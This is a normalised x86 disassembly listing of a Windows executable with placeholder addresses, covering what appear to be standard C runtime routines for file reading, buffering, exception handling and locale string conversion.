jmp r-xdata
or [ ebp + 0xc ] 0x40
jmp r-xdata
or [ ebp + 0xc ] edx
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_40698a
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
push 0x8
push r--data
push esi
call sub_40698a
add esp 0xc
test eax eax
jne r-xdata
add esi 0x5
or [ ebp + 0xc ] 0x40000
jmp r-xdata
or [ ebp + 0xc ] 0x10
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
push 0x7
push r--data
push esi
call sub_40698a
add esp 0xc
test eax eax
jne r-xdata
add esi 0x8
or [ ebp + 0xc ] 0x20000
jmp r-xdata
add esi 0x7
or [ ebp + 0xc ] 0x10000
jmp r-xdata
sub_40a5a6
push 0x10
push r--data
call sub_4099f4
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_408efb
pop ecx
mov [ ebp - 0x4 ] ebx
xor esi esi
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40a6d5
mov eax edi
call sub_409a39
retn
and [ edi + 0xc ] 0x8000
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
or [ edi + 0x10 ] 0xffffffff
shl esi 0x2
push 0x38
call sub_40ecc4
pop ecx
mov ecx [ rw-data ]
mov [ esi + ecx ] eax
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
mov eax [ eax ]
mov eax [ eax + 0xc ]
test al 0x83
jne r-xdata
push 0xfa0
mov eax [ eax ]
add eax 0x20
push eax
call sub_40df76
pop ecx
pop ecx
test eax eax
mov eax [ rw-data ]
jne r-xdata
inc esi
jmp r-xdata
test eax 0x8000
jne r-xdata
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ esi + eax ]
mov [ ebp - 0x1c ] edi
mov [ edi + 0xc ] ebx
push [ esi + eax ]
call sub_404d8e
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
lea eax [ esi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_40a240
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call sub_408e38
pop ecx
test eax eax
je r-xdata
mov edi eax
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
push esi
call sub_40a2ae
pop ecx
pop ecx
sub_40a6e0
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_40a770
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_4107a9
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_4107c8
jmp r-xdata
sub_40a770
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_4061c0
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_40a6e0
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_40a7d2
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_40a802
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40a833
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_407f64
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_40f436
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
mov [ esi + 0x4 ] edi
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_40b01d
pop ecx
push eax
call sub_40af20
add esp 0xc
mov [ esi + 0x4 ] eax
cmp eax edi
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_40b01d
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_40b01d
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push esi
call sub_40b01d
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_40b01d
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_40a95e
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_407f77
and [ eax ] 0x0
call sub_407f64
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_407f77
mov [ eax ] ebx
call sub_407f64
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x9
call sub_407efc
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_407f77
mov [ eax ] ebx
call sub_407f64
mov [ eax ] 0x9
jmp r-xdata
call sub_407f77
mov [ eax ] ebx
call sub_407f64
mov [ eax ] 0x16
mov [ ebp - 0x10 ] ebx
cmp edx ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_407efc
add esp 0x14
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_40ecc4
pop ecx
mov [ ebp - 0xc ] eax
cmp eax ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_40f298
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
mov eax [ ebp - 0xc ]
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_407f64
mov [ eax ] 0xc
call sub_407f77
mov [ eax ] 0x8
push ebx
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx ebx
jl r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_407f64
mov [ eax ] 0x9
call sub_407f77
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
cmp [ ebp - 0x2 ] bl
je r-xdata
push eax
call sub_407f8a
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0x10 ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_404d8e
pop ecx
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp cx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0xc ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp cx 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
inc ebx
inc ebx
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
inc ebx
inc ebx
inc eax
inc eax
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0xc ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0xc ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
inc ecx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0x10 ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0xc ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_407f64
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_40f298
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_40f298
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
inc ebx
inc ebx
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_40f298
add esp 0x10
inc ebx
cmp eax 0x2
mov [ ecx + 0x5 ] dl
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_40af20
push 0x10
push r--data
call sub_4099f4
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor esi esi
cmp eax esi
jl r-xdata
call sub_407f77
and [ eax ] 0x0
call sub_407f64
mov [ eax ] 0x9
call sub_407f77
mov [ eax ] esi
call sub_407f64
mov [ eax ] 0x9
cmp eax [ rw-data ]
jb r-xdata
call sub_409a39
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov edi eax
and edi 0x1f
shl edi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + edi + 0x4 ]
and ecx 0x1
je r-xdata
mov ecx 0x7fffffff
cmp ecx [ ebp + 0x10 ]
sbb ecx ecx
inc ecx
jne r-xdata
push eax
call sub_410949
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_407f77
mov [ eax ] esi
call sub_407f64
mov [ eax ] 0x16
jmp r-xdata
call sub_407f64
mov [ eax ] 0x9
call sub_407f77
mov [ eax ] esi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40a95e
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_407efc
add esp 0x14
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b013
mov eax [ ebp - 0x1c ]
sub_40b01d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0x10 ]
call sub_407f64
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
sub_40b04f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_407f64
push 0x16
pop esi
mov [ eax ] esi
pop edi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_40b0d0
add esp 0xc
cmp [ ebp + 0x10 ] edi
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_40b660
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_407f64
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_407efc
add esp 0x14
mov eax esi
jmp r-xdata
sub_40b0d0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x100
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_410c01
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_40b14a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_404d8e
pop ecx
sub_40b16a
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
push edi
mov esi ecx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor edi edi
inc edi
push edi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
dec eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
mov [ ebp + 0x14 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_410d4f
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4061c0
leave
retn
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_410d98
add esp 0x18
mov [ ebp - 0xc ] eax
cmp eax ebx
je r-xdata
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call sub_404d8e
pop ecx
mov esi [ LCMapStringA@IAT ]
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
mov eax esi
cmp [ ebp + 0x18 ] eax
je r-xdata
jle r-xdata
xor esi esi
jmp r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_404d8e
pop ecx
xor edi edi
cmp eax 0xffffffe0
ja r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0xc ]
call sub_40b14a
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx ebx
je r-xdata
push eax
call sub_404e6b
pop ecx
cmp eax ebx
je r-xdata
call sub_410f50
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
push ebx
push edi
call sub_40b0d0
add esp 0xc
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
add eax 0x8
cmp eax 0x400
ja r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call sub_410d98
mov esi eax
mov [ ebp - 0x10 ] esi
add esp 0x18
neg esi
sbb esi esi
and esi [ ebp - 0x8 ]
xor esi esi
jmp r-xdata
push eax
call sub_404e6b
pop ecx
cmp eax ebx
je r-xdata
call sub_410f50
mov edi esp
cmp edi ebx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
push edi
call sub_40b14a
pop ecx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
cmp ecx [ ebp + 0x1c ]
jg r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
push esi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
push esi
call sub_40b14a
pop ecx
push ebx
push ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
push eax
call sub_404e6b
pop ecx
cmp eax ebx
je r-xdata
call sub_410f50
mov esi esp
cmp esi ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
mov esi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ esi ] 0xcccc
add esi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp esi ebx
je r-xdata
sub_40b50f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_404a6a
push [ ebp + 0x28 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40b16a
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40b554
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
